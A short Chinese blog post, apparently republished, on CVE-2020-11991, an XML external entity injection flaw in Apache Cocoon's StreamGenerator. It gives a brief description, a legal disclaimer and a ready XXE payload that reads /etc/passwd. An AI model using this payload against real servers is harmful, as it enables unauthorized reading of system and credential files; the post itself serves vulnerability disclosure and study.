# Apache Cocoon XML注入[CVE-2020-11991] - Yangsir34 - 博客园

> 原文：[https://www.cnblogs.com/Yang34/p/13665674.html](https://www.cnblogs.com/Yang34/p/13665674.html)

### 请遵守网络安全法！！！本文仅供学习交流使用！用于任何非授权渗透、非法目的攻击、从事非法活动均与笔者无关！读者自行承担其恶果！

### 漏洞简介

程序使用了StreamGenerator这个方法时,解析从外部请求的xml数据包未做相关的限制,恶意用户就可以构造任意的xml表达式,使服务器解析达到XML注入的安全问题。

### 利用姿势

```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
<userInfo>
<firstName>John</firstName> 
<lastName>&ent;</lastName>
</userInfo> 
```

![](../Images/2e4a35baec86ccda962b26f7dc4ff837.png)

### 来源

```
http://mail-archives.apache.org/mod_mbox/cocoon-users/202009.mbox/author 
```